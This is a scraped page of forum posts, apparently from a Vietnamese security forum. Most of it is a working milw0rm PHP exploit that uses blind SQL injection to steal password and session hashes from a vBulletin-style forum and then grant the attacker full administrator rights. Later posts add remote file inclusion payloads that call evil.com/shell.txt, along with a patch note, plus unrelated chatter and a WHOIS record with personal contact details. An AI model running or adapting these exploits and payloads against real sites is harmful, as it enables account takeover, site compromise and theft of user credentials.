$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"You have an error in your SQL syntax",$html&#41;&#41;{echo $html; die&#40;"\nunknown query error..."&#41;;}
$temp=explode&#40;"showthread.php?t=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$thread=&#40;int&#41;$temp2&#91;0&#93;;
$packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"join date",$html&#41;&#41; {$sess_hash.=chr&#40;$i&#41;;echo chr&#40;$i&#41;; sleep&#40;1&#41;; break;}
}
if &#40;$i==255&#41; {
die&#40;"\nExploit failed..."&#41;;
}
}
$j++;
}
$j=1;$my_hash="";
echo "\nuser password hash -&gt; ";
while &#40;!strstr&#40;$my_hash,chr&#40;0&#41;&#41;&#41;
{
for &#40;$i=0; $i&lt;=255; $i++&#41;
{
if &#40;in_array&#40;$i,$chars&#41;&#41;
{
$data ="s=";
$data.="&do=docopyposts";
$data.="&destforumid=$forumid";
$data.="&title=suntzu";
$data.="&forumid=$forumid";
$data.="&postids=9999999&#41;/**/UNION/**/SELECT/**/&#40;IF&#40;&#40;ASCII&#40;SUBSTRING&#40;password,".$j.",1&#41;&#41;=".$i."&#41;,$existing_post,-999999&#41;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/user/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
$packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"You have an error in your SQL syntax",$html&#41;&#41;{echo $html; die&#40;"\nunknown query error..."&#41;;}
$temp=explode&#40;"showthread.php?t=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$thread=&#40;int&#41;$temp2&#91;0&#93;;
$packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"join date",$html&#41;&#41; {$my_hash.=chr&#40;$i&#41;;echo chr&#40;$i&#41;; sleep&#40;1&#41;; break;}
}
if &#40;$i==255&#41; {
die&#40;"\nExploit failed..."&#41;;
}
}
$j++;
}
$j=1;$cpsess_hash="";
echo "\ncp session hash -&gt; ";
while &#40;!strstr&#40;$cpsess_hash,chr&#40;0&#41;&#41;&#41;
{
for &#40;$i=0; $i&lt;=255; $i++&#41;
{
if &#40;in_array&#40;$i,$chars&#41;&#41;
{
$data ="s=";
$data.="&do=docopyposts";
$data.="&destforumid=$forumid";
$data.="&title=suntzu";
$data.="&forumid=$forumid";
$data.="&postids=9999999&#41;/**/UNION/**/SELECT/**/&#40;IF&#40;&#40;ASCII&#40;SUBSTRING&#40;hash,".$j.",1&#41;&#41;=".$i."&#41;,$existing_post,-999999&#41;&#41;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/cpsession/**/WHERE/**/userid=$uid/**/LIMIT/**/1/*";
$packet ="POST ".$p."inlinemod.php?f=$forumid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
$temp=explode&#40;"showthread.php?t=",$html&#41;;
$temp2=explode&#40;"\n",$temp&#91;1&#93;&#41;;
$thread=&#40;int&#41;$temp2&#91;0&#93;;
$packet ="GET ".$p."showthread.php?t=$thread HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie."; \r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
if &#40;eregi&#40;"You have an error in your SQL syntax",$html&#41;&#41;{echo $html; die&#40;"\nunknown query error..."&#41;;}
if &#40;eregi&#40;"join date",$html&#41;&#41; {$cpsess_hash.=chr&#40;$i&#41;;echo chr&#40;$i&#41;; sleep&#40;1&#41;; break;}
}
if &#40;$i==255&#41; {
die&#40;"\nExploit failed..."&#41;;
}
}
$j++;
}
echo "\n";
$packet ="GET ".$p."admincp/user.php?do=edit&u=$my_uid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5&#40;trim&#40;$my_hash&#41;&#41;."; bbuserid=".$uid."; ".$cookie_prefix."sessionhash=".trim&#40;$sess_hash&#41;."; ".$cookie_prefix."cpsession=".trim&#40;$cpsess_hash&#41;.";\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii&#40;$packet&#41;;
$temp=explode&#40;"adminhash\" value=\"",$html&#41;;
$temp2=explode&#40;"\"",$temp&#91;1&#93;&#41;;
$adminhash=$temp2&#91;0&#93;;
echo "adminhash -&gt;".$adminhash."\n";
if &#40;$adminhash&lt;&gt;""&#41; {echo "\ndone! you are in... updating ".$user." rights";}
else {die&#40;"\nexploit failed..."&#41;;}
//join to the Administrator group
$my_email="suntzu@suntzu.com";
$data ="do=update";
$data.="&adminhash=$adminhash";
$data.="&quicklinks=user.php%3Fdo%3Deditaccess%26u%3D".$my_uid;
$data.="&user%5Busername%5D=$user";
$data.="&password=";
$data.="&user%5Bemail%5D=$my_email";
$data.="&user%5Blanguageid%5D=0";
$data.="&user%5Busertitle%5D=Admin";
$data.="&user%5Bcustomtitle%5D=0";
$data.="&user%5Bhomepage%5D=";
$data.="&user%5Bbirthday%5D%5Bmonth%5D=0";
$data.="&user%5Bbirthday%5D%5Bday%5D=";
$data.="&user%5Bbirthday%5D%5Byear%5D=";
$data.="&user%5Bshowbirthday%5D=0";
$data.="&user%5Bsignature%5D=";
$data.="&user%5Bicq%5D=";
$data.="&user%5Baim%5D=";
$data.="&user%5Byahoo%5D=";
$data.="&user%5Bmsn%5D=";
$data.="&user%5Bskype%5D=";
$data.="&options%5Bcoppauser%5D=0";
$data.="&user%5Bparentemail%5D=$my_email";
$data.="&user%5Breferrerid%5D=";
$data.="&user%5Bipaddress%5D=";
$data.="&user%5Bposts%5D=0";
$data.="&userfield%5Bfield1%5D=";
$data.="&userfield%5Bfield2%5D=";
$data.="&userfield%5Bfield3%5D=";
$data.="&userfield%5Bfield4%5D=";
$data.="&user%5Busergroupid%5D=6";//primary usergroup, 6=Administrators
$data.="&user%5Bdisplaygroupid%5D=-1";
$data.="&user%5Bmembergroupids%5D%5B%5D=5";//secondary usergroup, 5=Super Moderators
$data.="&options%5Bshowreputation%5D=1";
$data.="&user%5Breputation%5D=10";
$data.="&user%5Bwarnings%5D=0";
$data.="&user%5Binfractions%5D=0";
$data.="&user%5Bipoints%5D=0";
$data.="&options%5Badminemail%5D=1";
$data.="&options%5Bshowemail%5D=0";
$data.="&options%5Binvisible%5D=0";
$data.="&options%5Bshowvcard%5D=0";
$data.="&options%5Breceivepm%5D=1";
$data.="&options%5Breceivepmbuddies%5D=0";
$data.="&options%5Bemailonpm%5D=0";
$data.="&user%5Bpmpopup%5D=0";
$data.="&options%5Bshowsignatures%5D=1";
$data.="&options%5Bshowavatars%5D=1";
$data.="&options%5Bshowimages%5D=1";
$data.="&user%5Bautosubscribe%5D=-1";
$data.="&user%5Bthreadedmode%5D=0";
$data.="&user%5Bshowvbcode%5D=1";
$data.="&user%5Bstyleid%5D=0";
$data.="&adminoptions%5Badminavatar%5D=0";
$data.="&adminoptions%5Badminprofilepic%5D=0";
$data.="&user%5Btimezoneoffset%5D=0";
$data.="&options%5Bdstauto%5D=1";
$data.="&options%5Bdstonoff%5D=0";
$data.="&user%5Bdaysprune%5D=-1";
$data.="&user%5Bjoindate%5D%5Bmonth%5D=2";
$data.="&user%5Bjoindate%5D%5Bday%5D=26";
$data.="&user%5Bjoindate%5D%5Byear%5D=2007";
$data.="&user%5Bjoindate%5D%5Bhour%5D=14";
$data.="&user%5Bjoindate%5D%5Bminute%5D=39";
$data.="&user%5Blastactivity%5D%5Bmonth%5D=2";
$data.="&user%5Blastactivity%5D%5Bday%5D=26";
$data.="&user%5Blastactivity%5D%5Byear%5D=2007";
$data.="&user%5Blastactivity%5D%5Bhour%5D=14";
$data.="&user%5Blastactivity%5D%5Bminute%5D=58";
$data.="&user%5Blastpost%5D%5Bmonth%5D=0";
$data.="&user%5Blastpost%5D%5Bday%5D=";
$data.="&user%5Blastpost%5D%5Byear%5D=";
$data.="&user%5Blastpost%5D%5Bhour%5D=";
$data.="&user%5Blastpost%5D%5Bminute%5D=";
$data.="&userid=".$mu_uid;
$data.="&ousergroupid=";
$data.="&odisplaygroupid=0";
$data.="&userfield%5Bfield1_set%5D=1";
$data.="&userfield%5Bfield2_set%5D=1";
$data.="&userfield%5Bfield3_set%5D=1";
$data.="&userfield%5Bfield4_set%5D=1";
$packet ="POST ".$p."admincp/user.php?do=edit&u=$my_uid HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5&#40;trim&#40;$my_hash&#41;&#41;."; ".$cookie_prefix."userid=".$uid."; ".$cookie_prefix."sessionhash=".trim&#40;$sess_hash&#41;."; ".$cookie_prefix."cpsession=".trim&#40;$cpsess_hash&#41;.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
sleep&#40;1&#41;;
//now give full rights to the new Administrator
$data ="do=update";
$data.="&adminhash=".$adminhash;
$data.="&adminpermissions%5Bcanadminsettings%5D=1";
$data.="&adminpermissions%5Bcanadminstyles%5D=1";
$data.="&adminpermissions%5Bcanadminlanguages%5D=1";
$data.="&adminpermissions%5Bcanadminforums%5D=1";
$data.="&adminpermissions%5Bcanadminthreads%5D=1";
$data.="&adminpermissions%5Bcanadmincalendars%5D=1";
$data.="&adminpermissions%5Bcanadminusers%5D=1";
$data.="&adminpermissions%5Bcanadminpermissions%5D=1";
$data.="&adminpermissions%5Bcanadminfaq%5D=1";
$data.="&adminpermissions%5Bcanadminimages%5D=1";
$data.="&adminpermissions%5Bcanadminbbcodes%5D=1";
$data.="&adminpermissions%5Bcanadmincron%5D=1";
$data.="&adminpermissions%5Bcanadminmaintain%5D=1";
$data.="&adminpermissions%5Bcanadminplugins%5D=1";
$data.="&cssprefs=";
$data.="&dismissednews=";
$data.="&userid=".$my_uid;
$data.="&oldpermissions=98300";
$data.="&adminpermissions%5Bcanadminupgrade%5D=0";
$packet ="POST ".$p."admincp/adminpermissions.php?do=update HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$packet.="Referer:<span class="link"> http://</span>".$host.$path."profile.php\r\n";
$packet.="Accept-Language: en\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="User-Agent: Mozilla/4.0 &#40;compatible; MSIE 7.0; Windows NT 5.1&#41;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen&#40;$data&#41;."\r\n";
$packet.="Pragma: no-cache\r\n";
$packet.="Cookie: ".$cookie_prefix."lastactivity=0; ".$cookie_prefix."password=".md5&#40;trim&#40;$my_hash&#41;&#41;."; ".$cookie_prefix."userid=".$uid."; ".$cookie_prefix."sessionhash=".trim&#40;$sess_hash&#41;."; ".$cookie_prefix."cpsession=".trim&#40;$cpsess_hash&#41;.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii&#40;$packet&#41;;
echo "\nnow go to<span class="link"> http://</span>".$host.$path."admincp/index.php and login to the control panel...";
?&gt;
# milw0rm.com &#91;2007-02-28&#93;</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/5100.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/5100/30000.html#30000,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">RapidKill 5.93 Release 9-12-06<br/><br/> Thằng này xài rất good !<br/> Down = link sau :<br/> <span class="link"> http://www.rapidkill.net/release/RapidKill593.by.Checkmate.zip</span><br/><br/><br/> Enjoy!</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4816.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4816/28285.html#28285,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>*************************************************************************************************************************
Coding 4 Fun
*************************************************************************************************************************
* Name = PHP Upload Center v2.0 ;
* Class = Remote/Local File Inclusion ;
* Download =<span class="link"> http://skrypty.webpc.pl/pobierz.php?id=58</span> ;
* Found by = GregStar &#40;gregstar&#91;at&#93;c4f&#91;dot&#93;pl&#41; &#40;http://c4f.pl&#41; ;
-------------------------------------------------------------------------------------------------------------------------
Vulnerable Code in activate.php
line 66-70
...
if &#40;!isset&#40;$language&#41;&#41;
$language=$dft_language;
if &#40;$language==""&#41;
$language=$dft_language;
require&#40;"include/${language}.php"&#41;; &lt;== Local incl.
...
line 164
...
include&#40;$footerpage&#41;; &lt;== Remote incl.
...
Code in include/en.php &#40;and other language files&#41;
line 5-7
...
$headerpage="include/header.htm";
$footerpage="include/footer.htm"; &lt;==
$infopage="include/info.htm";
...
- Ex. :
<span class="link"> http://&#91;target&#93;/&#91;path&#93;/activate.php?language=conf&footerpage=http://evil?</span>
*************************************************************************************************************************
Gr33tz: sASAn,marcel3miasto,masS,kaziq,Abi,kociaq,SlashBeast,chochlik,rfl,d3m0n,java,reyw,kw@ch.
*************************************************************************************************************************</pre>
</div><br/> Nguồn : milw0rm.com</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4488.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4488/26978.html#26978,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Thông tin từ 1 số người đã học ở đây<br/> <blockquote>1./Mình cũng học ở đấy, mình kg thích chỗ này lắm. Họ chia ra thành nhiều học phần, mỗi học phần học 5 môn. Mỗi môn học 5 buổi (1 tuần 1 buổi), có thực hành. Tính ra mỗi tuần lên lớp 2 buổi + thực hành. 920k một học phần.<br/><br/> Tài liệu sẽ là sách và CD, đều giống nhau cả. Kg biết các bạn học ngoài HN thế nào nhưng trong SG học kinh lắm. Phòng máy từ những năm 199x, máy kg có usb, chỉ có cái đĩa mềm chạy chung với máy chủ nên khi khởi động sẽ ngốn 30 phút. <img src="/hvaonline/images/smilies/eb4671cfc1e89a1e9b279c3afd578c28.gif" border="0" alt="smilie" align="absbottom"><br/> Học lập trình loại 198x chạy trên nền DOS, kg có giao diện windows. Các môn học vào chỉ đọc chép là chính (lập trình cũng chép!).<br/><br/> Nhưng nghe mấy ông nói bằng ra còn hơn bằng CNTT của DH KHTN !??<br/> Mình học từ khóa 3, giờ là khóa 5 rồi. Lớp mình mới vào có cả trăm đứa, giờ còn khoảng 20~40 đứa. Phải gộp mấy lớp vào học chung&nbsp;
</blockquote><br/><br/> <blockquote>2./Tui vừa tốt nghiệp Chuyên Viên CNTT (học 3 năm) của Trung tam phát triển CNTT-ĐHQG-Tp.HCM (tiền thân của ĐHCNTT đấy), nếu tui học chuyển tiếp thì sẽ được miễn giảm 11 môn học, vị chi là chỉ còn phải học 2,5 năm nữa là lấy bằng Cử nhân CNTT qua mạng viễn thông. Sẽ chỉ phải lên lớp 4 buổi 1 tuàn thui, còn k thì thứ 7 hay CN lên lớp nguyên ngày, tài liệu giáo trình đủ cả (quan trọng co chịu hoc k thui, hehe) có thể mua trọn bộ đĩa CD về tự học, sẽ đc cấp account trên web để lấy bài giảng.... Tuy nhiên chất lượng thì có vẻ k đc tốt lắm, em hoc rùi nên biết. Chán&nbsp;
</blockquote><br/><br/> Mong 1 số thông tin đó có thể giúp được phần nào cho bạn.</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/21.html">Thảo luận việc định hướng</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/4134.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/4134/24442.html#24442,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Mình nghe nói Cao Đẳng Bán Công Hoa Sen dạy lập trình web cũng khá lằm đấy</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.html">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3660.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3660/21224.html#21224,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>NeXtMaN &lt;mc.nadz &#91;at&#93; gmail.com&gt;
Here are 3 RFI vulnerabilities in Flashchat i've found:
Code:<span class="link"> http://site.com/&#91;script_path&#93;/inc/cmses/aedating4CMS.php?dir&#91;inc&#93;=http://evil.com/shell.txt?</span><span class="link"> http://site.com/&#91;script_path&#93;/inc/cmses/aedatingCMS2.php?dir&#91;inc&#93;=http://evil.com/shell.txt?</span><span class="link"> http://site.com/&#91;script_path&#93;/inc/cmses/aedatingCMS.php?dir&#91;inc&#93;=http://evil.com/shell.txt?</span>
video here:
Code:<span class="link"> http://rapidshare.de/files/31362430/Flashchat.rar.html</span>
EDIT: Solution:
It looks like the vulnerable files are there in case you want to integrate with another script. The script that would require these files is AEDating:
you simply delete the following files and you will be secure:
/inc/cmses/aedating4CMS.php
/inc/cmses/aedatingCMS.php
/inc/cmses/aedatingCMS2.php
if your flashchat is integrated with AEDating and/or you dont want to delete the files you can just edit the 3 files to use your path like this:
Replace this:
$aed_root_path = realpath&#40;dirname&#40;__FILE__&#41; . '/../../../'&#41; . '/';
include&#40;$aed_root_path . 'inc/header.inc.php'&#41;;
require_once&#40; "$dir&#91;inc&#93;db.inc.php" &#41;;
require_once&#40; "$dir&#91;inc&#93;admin.inc.php" &#41;;
With this:
$aed_root_path = realpath&#40;dirname&#40;__FILE__&#41; . '/../../../'&#41; . '/';
include&#40;$aed_root_path . 'inc/header.inc.php'&#41;;
require_once&#40; "&#91;Your AED path&#93;/db.inc.php" &#41;;
require_once&#40; "&#91;Your AED path&#93;/admin.inc.php" &#41;;
Alternatively you could just upgrade to 4.6.2 &#40;just released&#41;
PS, all 3 of those files are vulnerable and will need editing.</pre>
</div><br/> # milw0rm.com [2006-09-04]<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/27.html">Thông tin về các địa chỉ và tài liệu hữu ích</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3358.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3358/20482.html#20482,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">thanks hung1910</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.html">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3311.html">Empty</a></span>
				<span class="topmenu"><img src="/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3311/18851.html#18851,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody"><font color='red'>MUABANDTDD.COM</font><br/> <blockquote>Domain Name: MUABANDTDD.COM<br/> Registrar: ENOM, INC.<br/> Whois Server: whois.enom.com<br/> Referral URL:<span class="link"> http://www.enom.com</span><br/> Name Server: DNS1.NAME-SERVICES.COM<br/> Name Server: DNS2.NAME-SERVICES.COM<br/> Name Server: DNS3.NAME-SERVICES.COM<br/> Name Server: DNS4.NAME-SERVICES.COM<br/> Name Server: DNS5.NAME-SERVICES.COM<br/> Status: REGISTRAR-LOCK<br/> Updated Date: 13-may-2005<br/> Creation Date: 03-jun-2002<br/> Expiration Date: 03-jun-2010<br/><br/> Domain name: muabandtdd.com<br/><br/> Registrant Contact:<br/> MAI NGUYEN MOBILE PHONE<br/> Mai Trieu Nguyen (mainguyenmobile@yahoo.com)<br/> (848) 9100332<br/> Fax: (848) 9103305<br/> Saigon<br/> Saigon, 10000<br/> VN<br/><br/> Administrative Contact:<br/> MAI NGUYEN MOBILE PHONE<br/> Mai Trieu Nguyen (mainguyenmobile@yahoo.com)<br/> (848) 9100332<br/> Fax: (848) 9103305<br/> Saigon<br/> Saigon, 10000<br/> VN<br/><br/> Technical Contact:<br/> MAI NGUYEN MOBILE PHONE<br/> Mai Trieu Nguyen (mainguyenmobile@yahoo.com)<br/> (848) 9100332<br/> Fax: (848) 9103305<br/> Saigon<br/> Saigon, 10000<br/> VN<br/><br/> Status: Locked<br/><br/> Name Servers:<br/> dns1.name-services.com<br/> dns2.name-services.com<br/> dns3.name-services.com<br/> dns4.name-services.com<br/> dns5.name-services.com<br/><br/> inetnum: 222.252.0.0 - 222.255.255.255<br/> netname: VNPT-VNNIC-VN<br/> descr: Vietnam Posts and Telecommunications Corp (VNPT)<br/> descr: 23 Phan Chu Trinh st., Hanoi capital, Vietnam<br/> country: VN<br/> admin-c: NXC1-AP<br/> tech-c: KNH1-AP<br/> remarks: for admin contact mail to Nguyen Xuan Cuong --&gt; NXC1-AP<br/> remarks: for Tech contact mail to Nguyen Hien Khanh --&gt; KNH1-AP<br/> mnt-by: MAINT-VN-VNNIC<br/> mnt-lower: MAINT-VN-VNPT<br/> status: ALLOCATED PORTABLE<br/> notify: <a href="mailto:hm-change@vnnic.net.vn">hm-change@vnnic.net.vn</a><br/> changed: <a href="mailto:hm-changed@apnic.net">hm-changed@apnic.net</a> 20040518<br/> changed: <a href="mailto:hm-changed@apnic.net">hm-changed@apnic.net</a> 20040518<br/> source: APNIC<br/><br/> person: Nguyen Xuan Cuong<br/> nic-hdl: NXC1-AP<br/> e-mail: <a href="mailto:cuong.ng@vnn.vn">cuong.ng@vnn.vn</a><br/> address: Vietnam Posts and Telecommunications (VNPT)<br/> address: 18 Nguyen Du street, Hanoi capital, Vietnam<br/> phone: +84-4-9430427<br/> fax-no: 